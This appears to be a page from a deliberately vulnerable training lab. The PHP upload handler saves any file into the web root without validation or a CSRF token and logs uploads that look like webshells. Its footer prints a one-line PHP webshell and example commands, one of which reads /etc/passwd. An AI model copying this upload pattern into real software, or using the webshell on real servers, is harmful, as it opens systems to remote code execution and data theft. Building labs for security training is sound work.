<?php
// Vuln 5: Unrestricted File Upload -> RCE

function write_log($msg) {
    $ts = date('Y-m-d H:i:s');
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    file_put_contents('/var/log/vuln-lab/upload_attempts.log',
        "[$ts] IP=$ip | $msg\n", FILE_APPEND);
}

$message = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $file     = $_FILES['file'];
    $filename = $file['name'];
    $tmpfile  = $file['tmp_name'];
    $size     = $file['size'];
    $type     = $file['type'];

    write_log("UPLOAD | name='$filename' type='$type' size=$size");

    // Detect shell upload attempt
    if (preg_match('/\.(php|php3|php5|phtml|phar|sh|py|pl|rb)$/i', $filename)) {
        write_log("ALERT: Possible webshell upload! file='$filename'");
    }

    // VULNERABLE: No validation whatsoever
    $dest = "/var/www/html/uploads/" . $filename;
    
    if (move_uploaded_file($tmpfile, $dest)) {
        write_log("SUCCESS | saved to '$dest'");
        $message = "Upload berjaya: <a href='/uploads/$filename'>$filename</a>";
        
        // Extra log: if it's executable
        if (is_executable($dest)) {
            write_log("WARNING: Uploaded file is executable! '$filename'");
        }
    } else {
        write_log("FAILED | could not save '$filename'");
        $message = "Upload gagal";
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>File Upload</title>
    <style>
        body { font-family: monospace; background: #1a1a1a; color: #00ff00; padding: 20px; }
        input[type=file] { background: #333; color: #fff; }
        button { background: #444; color: #0f0; border: 1px solid #0f0; padding: 8px 20px; }
        .msg { color: #ff0; padding: 10px; border: 1px solid #ff0; margin: 10px 0; }
    </style>
</head>
<body>
<h2>File Upload (RCE via Webshell)</h2>

<!-- Vuln: No CSRF token, no file type check -->
<form method="POST" enctype="multipart/form-data">
    <input type="file" name="file"><br><br>
    <button type="submit">Upload</button>
</form>

<?php if ($message): ?>
<div class="msg"><?= $message ?></div>
<?php endif; ?>

<hr>
<small>
    RCE test: Upload file <code>shell.php</code> dengan kandungan:<br>
    <code>&lt;?php system($_GET['cmd']); ?&gt;</code><br>
    Then access: <code>/uploads/shell.php?cmd=id</code><br>
    Or: <code>/uploads/shell.php?cmd=cat /etc/passwd</code>
</small>
</body>
</html>
